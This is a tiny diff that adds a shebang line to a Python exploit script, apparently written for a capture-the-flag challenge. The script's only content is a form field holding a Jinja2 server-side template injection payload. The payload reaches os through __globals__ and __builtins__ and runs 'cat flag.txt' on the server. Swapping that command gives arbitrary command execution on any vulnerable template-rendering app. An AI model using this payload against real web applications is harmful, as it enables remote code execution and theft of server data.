@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import requests
 
 data = {'date': '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'cat flag.txt\').read()}}'}
